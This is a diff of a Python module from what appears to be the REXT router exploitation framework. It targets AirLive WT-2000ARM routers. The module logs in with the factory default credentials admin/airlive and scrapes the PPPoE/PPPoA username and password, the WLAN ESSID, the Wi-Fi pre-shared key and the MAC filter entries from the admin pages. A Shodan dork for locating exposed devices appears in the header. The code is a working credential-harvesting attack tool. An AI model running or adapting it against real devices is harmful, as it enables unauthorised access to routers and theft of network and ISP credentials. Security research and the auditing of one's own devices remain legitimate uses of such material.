@@ -3,20 +3,18 @@
 # Author:Ján Trenčanský
 # License: GNU GPL v3
 # Created: 29.8.2013
-# Last modified: 19.8.2015
+# Last modified: 24.12.2016
 # Shodan Dork: WWW-Authenticate: Basic realm="AirLive WT-2000ARM
-# Description:This module is old, very very old, major refactoring is needed
-# Actually it's complete shit I'll have to rewrite it completly
-# TODO:Don't use it's broken
+# Description: Module will fetch PPPoE/PPPoA credentials and WLAN credentials also MAC address filter values
+# First module of REXT ever
 
-# UI
-# WEP/WPA
 
 import requests
 import requests.exceptions
-import re
+import bs4
 import core.Harvester
-from interface.messages import print_failed, print_success, print_red, print_green, print_warning, print_error
+from interface.messages import print_success, print_error, print_info, print_help
+import interface.utils
 
 
 class Harvester(core.Harvester.RextHarvester):
@@ -26,123 +24,111 @@ File:WT2000ARM.py
 Author:Ján Trenčanský
 License: GNU GPL v3
 Created: 29.8.2013
-Description:This module is old, very very old, major refactoring is needed
-    Actually it's complete shit I'll have to rewrite it completly
+Description: Module will fetch PPPoE/PPPoA credentials and WLAN credentials also MAC address filter values
 
 Options:
     Name        Description
 
     host        Target host address
     port        Target port
+    username    Target username
+    password    Target password
     """
-    #Default credentials and default IP of target ( ,() is there because of for cycle that goes through credentials)
-    def __init__(self):  # need to fix passing credentials () breaks for cycle)
-        self.credentials_list = (("admin", "airlive"), ())
+
+    username = 'admin'
+    password = 'airlive'
+
+    def __init__(self):
         core.Harvester.RextHarvester.__init__(self)
 
-    #Start method needs to be named do_* for nested interpreter
-    def do_run(self, e):
-        for credentials in self.credentials_list:
-            username = credentials[0]
-            password = credentials[1]
-            auth = (username, password)
-            #Sending request
-            try:
-                print("Connecting to " + self.host)
-                response = requests.get("http://"+self.host+"/basic/home_wan.htm", auth=auth, timeout=60)
-                #headers, body = http.request("http://"+self.target+"/basic/home_wan.htm")
-                #Checks if authentication was successful
-                if response.status_code == 200:
-                    print("200:Authentication successful :)")
-                    ppp_credentials = self.fetch_ppp(response.text)
-                    print(ppp_credentials)
-                    #Sending request for home_wlan
-                    response = requests.get("http://"+self.host+"/basic/home_wan.htm", auth=auth, timeout=60)
-                    if response.status_code == 200:
-                        wlan_credentials = self.fetch_wlan(response.text)
-                        print(wlan_credentials)
-                        return 1
-                    else:
-                        print_error("Failed fetching home_wlan.html. Status code:"+response.status_code)
-                        return -1
-                elif response.status_code == 401:
-                    print("401:Authentication failed")
-                    continue
-                elif response.status_code == 404:
-                    print("404:Page does not exists")
-                    break
+    def do_set(self, e):
+        args = e.split(' ')
+        try:
+            if args[0] == "host":
+                if interface.utils.validate_ipv4(args[1]):
+                    self.host = args[1]
                 else:
-                    print("Something went wrong here. Status code:"+response.status_code)
-                    break
-            except requests.exceptions.Timeout:
-                print_error("Timeout!")
-            except requests.exceptions.ConnectionError:
-                print_error("No route to host")
-        return 1  # this shouldn't happen
+                    print_error("please provide valid IPv4 address")
+            elif args[0] == "port":
+                if str.isdigit(args[1]):
+                    self.port = args[1]
+                else:
+                    print_error("port value must be integer")
+            elif args[0] == "username":
+                self.username = args[1]
+            elif args[0] == "password":
+                self.password = args[1]
+        except IndexError:
+            print_error("please specify value for variable")
+
+    def do_password(self, e):
+        print_info(self.password)
+
+    def help_password(self):
+        print_help("Prints current value of password")
+
+    def help_username(self):
+        print_info("Prints current value of username")
+
+    def do_username(self, e):
+        print_info(self.username)
+
+    def do_run(self, e):
+        try:
+            print_info("Connecting to:", self.host)
+            auth = (self.username, self.password)
+            response = requests.get("http://"+self.host+"/basic/home_wan.htm", auth=auth, timeout=60)
+            # headers, body = http.request("http://"+self.target+"/basic/home_wan.htm")
+            if response.status_code == 200:
+                print_success("Authentication successful")
+                ppp_credentials = self.fetch_ppp(response.text)
+                print_success("PPPoE/PPPoA Username:", ppp_credentials[0])
+                print_success("PPPoE/PPPoA Password", ppp_credentials[1])
+                response = requests.get("http://"+self.host+"/basic/home_wlan.htm", auth=auth, timeout=60)
+                if response.status_code == 200:
+                    wlan_credentials = self.fetch_wlan(response.text)
+                    print_success("ESSID:", wlan_credentials[0])
+                    print_success("PSK:", wlan_credentials[1])
+                    for mac in wlan_credentials[2]:
+                        print_success("MAC filter:", mac)
+                else:
+                    print_error("Status code:", response.status_code)
+            elif response.status_code == 401:
+                print_error("401 Authentication failed")
+            elif response.status_code == 404:
+                print_error("404 Page does not exists")
+            else:
+                print_error("Status code:", response.status_code)
+        except requests.exceptions.Timeout:
+            print_error("Timeout!")
+        except requests.exceptions.ConnectionError:
+            print_error("No route to host")
             
     def fetch_ppp(self, body):
-        html = body.decode('ascii')
-        #Regex for username
-        username_re = re.compile(r"""   #raw string
-            NAME="wan_PPPUsername"      #search for wan_PPPUsername
-            [^>]*?                      #Ignore any args between NAME and VALUE
-            VALUE=                      #VALUE parameter
-            (?P<quote>["'])             #Simple or double quotes
-            (?P<username>[^\1]+?)       #Get ppp_username
-            (?P=quote)                  #closed by quotes
-            [^>]*?                      #any other args after NAME
-            >                           #close of INPUT tag
-            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
-        #Regex for password
-        password_re = re.compile(r"""   #raw string
-            NAME="wan_PPPPassword"      #search for wan_PPPPassword
-            [^>]*?                      #Ignore any args between NAME and VALUE
-            VALUE=                      #VALUE parameter
-            (?P<quote>["'])             #Simple or double quotes
-            (?P<password>[^\1]+?)       #Get ppp_password
-            (?P=quote)                  #closed by quotes
-            [^>]*?                      #any other args after NAME
-            >                           #close of INPUT tag
-            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
-        ppp_username = username_re.search(html)
-        ppp_username = ppp_username.group("username")
-        ppp_password = password_re.search(html)
-        ppp_password = ppp_password.group("password")
-        ppp_credentials = (ppp_username,ppp_password)
-        return ppp_credentials
+        wan_page_soap = bs4.BeautifulSoup(body, 'html.parser')
+        inputs = wan_page_soap.find_all("input")
+        ppp_username = ""
+        ppp_password = ""
+        for i in inputs:
+            if i['name'] == "wan_PPPUsername":
+                ppp_username = i['value']
+            elif i['name'] == "wan_PPPPassword":
+                ppp_password = i['value']
+        return ppp_username, ppp_password
 
-    def fetch_wlan(self,body):
-        html = body.decode('ascii')
-        essid_re = re.compile(r"""   #raw string
-            name="ESSID"                #search for essid
-            [^>]*?                      #Ignore any args between NAME and VALUE
-            value=                      #VALUE parameter
-            (?P<quote>["'])             #Simple or double quotes
-            (?P<essid>[^\1]+?)          #Get essid
-            (?P=quote)                  #closed by quotes
-            [^>]*?                      #any other args after NAME
-            >                           #close of INPUT tag
-            """, re.ASCII|re.IGNORECASE|re.VERBOSE)
-        #TODO return more than one key, skip keys 0x0000000000
-        #TODO add support for determination of encryption type
-        #WPA passphrase 
-        wep_key_re = re.compile(r"""   #raw string
-            name="WEP_Key[1-9]          #search for wan_PPPPassword
-            [^>]*?                      #Ignore any args between NAME and VALUE
-            value=                      #VALUE parameter
-            (?P<quote>["'])             #Simple or double quotes
-            (?P<key>[^\1]+?)            #Get key
-            (?P=quote)                  #closed by quotes
-            [^>]*?                      #any other args after NAME
-            >                           #close of INPUT tag
-            """, re.ASCII | re.IGNORECASE | re.VERBOSE)
-        essid = essid_re.search(html)
-        essid = essid.group("essid")
-        wep_key = wep_key_re.search(html)
-        wep_key = wep_key.group("key")
-        wlan_credentials = (essid,wep_key)
-        return wlan_credentials
-                
+    def fetch_wlan(self, body):
+        wan_page_soap = bs4.BeautifulSoup(body, 'html.parser')
+        inputs = wan_page_soap.find_all("input")
+        essid = ""
+        wlan_psk = None
+        mac_filter_list = []
+        for i in inputs:
+            if i['name'] == "ESSID":
+                essid = i['value']
+            elif i['name'] == "PreSharedKey":
+                wlan_psk = i['value']
+            elif i['name'] == "WLANFLT_MAC":
+                mac_filter_list.append(i['value'])
+        return essid, wlan_psk, mac_filter_list
 
-#if __name__ == "__main__":
 Harvester()
